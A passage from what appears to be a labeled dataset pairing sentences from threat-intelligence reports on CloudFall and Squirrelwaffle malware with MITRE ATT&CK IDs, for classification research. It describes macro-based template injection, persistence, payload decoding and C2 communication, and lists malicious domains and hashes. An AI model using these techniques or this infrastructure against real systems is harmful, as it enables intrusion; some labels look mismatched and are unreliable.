Capture](https://attack.mitre.org/techniques/T1113)", "labels": ["T1185"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1125: Video Capture](https://attack.mitre.org/techniques/T1125) |", "labels": ["T1125"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Command and Control (C2)** | [T1071.001: Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001)", "labels": ["TA0011", "T1071"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1071.003: Application Layer Protocol: Mail Protocols](https://attack.mitre.org/techniques/T1071/003)", "labels": ["T1071"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "[T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) |", "labels": ["T1105"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "| **Exfiltration** | [T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol](https://attack.mitre.org/techniques/T1048/003) |", "labels": ["T1048"], "document": "quoteintelligence_2021-06-30_daily-operations-of-a-nigerian"}, {"sentence": "CloudFall Targets Researchers and Scientists Invited to International Military Conferences in Central Asia and Eastern Europe", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "In August 2021, Zscaler ThreatLabz identified several malicious Microsoft Word documents which used a multi-stage attack-chain abusing Cloudflare Workers and features of MS Office Word to target users in Central Asia and Eastern Europe.", "labels": ["T1566"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Based on the social engineering lures used in the decoy content, we conclude with a moderate confidence level that the targets of this campaign were scientists and researchers who were invited to International military conferences.", "labels": ["T1589"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "We have named this threat actor CloudFall based on the network infrastructure used by them.", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "There is also a strong overlap between this threat actor and the CloudAtlas APT group.", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Unlike common macro-based document attacks, in this targeted campaign we observed the threat actor abusing MS Office Word features to evade automated analysis systems.", "labels": ["T1059", "T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "2.Naming convention of attacker-controlled C2 domains", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**Attack-chain**: In all the cases, an MS Office Word document was used to download a remote document template and carry out the attack in multiple stages.", "labels": ["T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**Naming conventions of attacker-controlled C2 domains**: We observed a consistent pattern across all the C2 domains used in this targeted campaign.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "All the C2 servers used Cloudflare Worker domains and most of the subdomain names were crafted to spoof Microsoft service names such as Office 365.", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "By combining all of the above observations, we can say with a moderate confidence level that there is an overlap with CloudAtlas APT threat actor.", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "CloudAtlas APT has targeted users in Central Asia and Eastern Europe in the past with documents sent in spear-phishing emails and downloaded remote templates.", "labels": ["T1566"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "CloudAtlas has also abused legitimate cloud-based services, such as CloudMe, in the past and used domain names that spoof legitimate Microsoft services.", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%201.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%202.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 3](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%203.jpg)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The interesting thing to note here is that the attacker doesn\u2019t use the standard DOCX file format (OOXML) for template injection where we have the XML file referencing the document template from a network path.", "labels": ["T1221"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "#### **Stage-2: Macro-based template document**", "labels": ["T1221"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Once macros are enabled by the user, the VBA macro code inside the downloaded template is executed.", "labels": ["T1059"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The macro code performs the following operations:", "labels": ["T1059"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Below is the relevant VBA macro code responsible for this.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**2.** When the document is closed, it checks whether a document template file is present in the path: \"%appdata%\\Microsoft\\Word\\STARTUP\\Main.dotm\".", "labels": ["T1083"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "It's important to note that the above directory path corresponds to STARTUP location used by Microsoft Office Word application to load global templates.", "labels": ["T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The template file is downloaded as base64-encoded data from the URL: \"https://cloud.digitalstorage.workers[.]dev/old/data\".", "labels": ["T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Macro replaces \u00a0\"$\" with \"A\" and \"#\" with \"Q\" in the mangled response before base64-decoding.", "labels": ["T1059", "T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The template file \"Main.dotm\" acts as a persistence template since it is loaded whenever the Microsoft Word application is started.", "labels": ["T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Similar to Stage-2, this is also a macro-based template.", "labels": ["T1221"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The malicious macro code is defined under the AutoExit function which is executed when the Microsoft Word application is closed or the global template defining it is unloaded.", "labels": ["T1059"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Upon execution, the macro code downloads a base64-encoded binary either from \"mirror.advancestore.workers[.]dev/max/bs\" or \"mirror.advancestore.workers[.]dev/min/bs\" based on the checks performed.", "labels": ["T1027"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Similar to Stage-2, the base64-encoded binary is mangled and requires character substitution before decoding.", "labels": ["T1027", "T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Once decoded, the macro code drops it as the next stage payload in the path %localappdata%\\Photos\\Microsoft.Photos.exe and executes it.", "labels": ["TA0002", "T1140", "T1059"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**Note**: The dropped file name spoofs legitimate Windows binary for Microsoft Photos.", "labels": ["T1036"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%204.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "*Figure 4: VBA macro code of Stage-3 persistence document template*", "labels": ["T1059", "T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The Stage-4 dropped binary is heavily obfuscated using control flow obfuscation, function inlining, stack-based strings generation, strings encoding, etc which makes the dynamic analysis of the binary inside a debugger difficult.", "labels": ["T1027", "T1027"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "To further hinder the dynamic analysis using debugger, the binary performs self checksum check to detect any attached debugger.", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 5](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%205.jpg)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Executing further, the malicious binary checks for the presence of the file conf.h in the current working directory.", "labels": ["T1083"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Conf Check](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Conf%20Check.jpg)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "*Figure 6:\u00a0Code section which performs conf.h string generation and file existence check*", "labels": ["T1083"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**Note:** \u00a0The file is likely fetched and dropped by the binary as part of C2 communication", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "If the conf.h file doesn\u2019t exist, then it checks the following browser directories for the presence of specific files one at a time:", "labels": ["T1083"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "In case the calculated size is less than the threshold value or if none of the browser directory mentioned above exists, the binary terminates.", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**Note:** The size check is likely performed to detect analysis environments like Sandbox and Virtual Machine", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Threshold Check](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Threshold%20Check.jpg)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "*Figure 7: Code section which performs the\u00a0threshold check*", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "If the check passes for any of the three browser directories mentioned above then it starts the network communication.", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The network communication is performed over standard TCP/IP protocol.", "labels": ["T1071"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The details for the C2 server communication are mentioned below:", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**C2 Domain:** curly-waterfall-360d.fetrikekke531.workers.dev", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**Beacon request URI:** auth/local/register", "labels": ["S0154"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**Note:** During analysis we didn\u2019t get any active response from the C2 server.", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The thumbprint of the SSL certificate of the C2 domain is: 5cdf93a4081898d99a686ad472b553cddaa9f3bf", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Using the thumbprint of the SSL certificate as a pivot, we discovered another C2 domain: virustotall-360d.fetrikekke531.workers[.]dev", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The second variant of this attack, which we observed in August 2021 made significant changes to the macro code used in the document to deploy the payload on the machine.", "labels": ["T1059", "T1204"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Similar to variant 1, variant 2 also downloads a remote document template hosted on an attacker-controlled Cloudflare Worker instance.", "labels": ["T1221"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "However, unlike variant 1, in this case, the persistence document template as well as the final payload\u2014both are embedded inside the stage-2 document itself.", "labels": ["T1137", "T1027"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 7](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%207.jpg)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**1.** Stage-1 document downloads remote document template (Stage-2)", "labels": ["T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**2.** Since MS Office Word was used to download the document template (Stage-2), by default it will be present inside the INetCache directory.", "labels": ["T1059"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The VBA macro code uses a clever technique to locate this file in the path: \"%localappdata%\\Microsoft\\Windows\\INetCache\\Content.MSO\\\" as shown in Figure 9.", "labels": ["T1059", "T1036"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%208.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "*Figure 9: VBA macro code of Stage-2 document template of variant 2*", "labels": ["T1059"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**a)** This code enumerates the files in the directory: \"%localappdata%\\Microsoft\\Windows\\INetCache\\Content.MSO\\\" until it finds a file with size 70400 (truncated)", "labels": ["T1083"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**b)** Once it finds the file, it will Unzip the contents to the directory path: \"%localappdata%\\VirtualEnv\".", "labels": ["T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "OOXML file format is essentially an archive file format, and that\u2019s why the macro unzips it.", "labels": ["T1027", "T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**c)** Inside the OOXML file, there is an XML file called Archive.xml which contains an encoded version of the persistence template.", "labels": ["T1027", "T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "This is decoded and dropped to the path: %appdata%\\Microsoft\\Word\\STARTUP\\Settings.dotm", "labels": ["T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**d)** In order to decode the contents of Archive.xml it performs character substitution to restore the original characters of the base64-encoded string.", "labels": ["T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "This type of custom base64 decoding is similar to variant 1", "labels": ["T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**3.** Once a new instance of the Word application is started on the machine, this persistence template is loaded and the next sequence of steps are carried out to drop the final payload as shown in Figure 10.", "labels": ["T1137", "T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 9](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%209.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "*Figure 10: VBA macro code of persistence template of variant 2*", "labels": ["T1059", "T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**a)** Decodes and extracts the payload from WebArchive.xml file.", "labels": ["T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "The method for decoding is similar to the one described previously.", "labels": ["T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**b)** The decoded file is the final payload which will be dropped to the path: %localappdata%\\VirtualEnv\\word\\Virtual.exe", "labels": ["T1140"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 14](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2014.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**[+] C2 Domains - Documents**", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**[+] C2 Domains - Dropped binary**", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "**[+] C2 domains - Additional**", "labels": ["TA0011"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "| Stage-3 persistence template | cloud.digitalstorage.workers[.]dev/old/dataplug.repository.workers[.]dev/modules/private |", "labels": ["T1137"], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 10](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2010.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 11](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2011.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 12](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2012.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "![Figure 13](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/CloudFall/Picture%2013.png)", "labels": [], "document": "zscaler_2021-09-09_cloudfall-targets-researchers-and-scientists"}, {"sentence": "Squirrelwaffle: New Loader Delivering Cobalt Strike", "labels": ["S0154"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Zscaler ThreatLabz has been following an emerging new malware loader known as Squirrelwaffle that is being used to deliver Cobalt Strike.", "labels": ["S0154"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The Squirrelwaffle loader is being delivered from the same infrastructure that was delivering the Qakbot banking trojan.", "labels": ["S0650"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 1: Squirrelwaffle Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Attack%20chain.png)", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 1: Squirrelwaffle Attack Chain", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "* The campaign started with a malicious document file delivered via spam email campaigns with embedded URLs.", "labels": ["T1566"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "* The spam campaign is using an email thread hijacking technique that was previously used for Emotet and Qakbot malware campaigns.", "labels": ["S0367", "S0650"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.", "labels": ["TA0002", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "* The VBS file downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads Cobalt Strike.", "labels": ["S0154", "T1059", "T1105"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "* The same infrastructure was used to deliver the Qakbot banking trojan.", "labels": ["S0650"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.", "labels": ["T1566"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.", "labels": ["T1566"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Once a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.", "labels": ["T1566"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Once the user enables the macro, an *AutoOpen()* subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.", "labels": ["TA0002", "T1204", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.", "labels": ["T1059", "T1059", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.", "labels": ["T1059", "T1027", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Macro%20analysis1.PNG)", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 3: Example VBA code that drops a VBS file in the %ProgramData% folder that is used to download Squirrelwaffle", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The payload DLL is executed via rundll32.exe by invoking the export function name *ldr*.", "labels": ["T1218"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/vbs%20file.PNG)", "labels": ["TA0002", "T1059", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 4: Example VBS code that downloads and executes the Squirrelwaffle loader.", "labels": ["TA0002", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 5 shows the ProgramData folder after the VBS script is executed and the Squirrelwaffle payloads have been downloaded", "labels": ["T1059", "T1105"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/File%20dropped%20in%20Program%20Data%20Folder.PNG)", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 5: Disk artifacts after the pin.vbs file has been executed and downloaded the Squirrelwaffle loader DLL.", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an *Auto\\_Open()* macro, which downloads the Squirrelwafle loader from three different URLs.", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.", "labels": ["T1218"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/xls.PNG)", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 6: Microsoft Excel with a malicious macro used to deliver Squirrelwaffle", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 7: Excel 4.0 hidden sheet containing a malicious macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/unhide%20the%20sheets.PNG)", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 7: Excel 4.0 hidden sheet containing a malicious macro code", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The extracted macro code is shown in Figure 8.", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 8: Macro code extracted from a hidden Excel sheet](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/macro%20code%20from%20xls.PNG)", "labels": ["T1059", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 8: Macro code extracted from a hidden Excel sheet", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "This analysis covers the Squirrelwaffle with the MD5 hash479DAE0F72F4D57BD20E0BF8CB3EBDF7.", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.", "labels": ["T1218", "T1218"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 9: Squirrelwaffle compilation metadata](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Compilation%20time.PNG)", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 9: Squirrelwaffle compilation metadata", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.", "labels": ["T1218", "T1027"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Similar packers have been observed in other malware families including Ursnif and Zloader.", "labels": ["S0386"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "These lists are obfuscated using an XOR-based algorithm with hardcoded keys.", "labels": ["T1027"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "An example formatted Squirrelwaffle configuration is shown in Figure 10.", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 10: Formatted Squirrelwaffle configuration after decryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Config%20extracted.PNG)", "labels": ["T1027"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 10: Formatted Squirrelwaffle configuration after decryption", "labels": ["T1027"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a **socket** and sends the data using the **send()** function and receives the content from the CnC using **recv()** calls.", "labels": ["T1140", "T1071"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key ***KJKLO***.", "labels": ["T1071", "T1132"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.", "labels": ["T1132"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The HTTP POST body 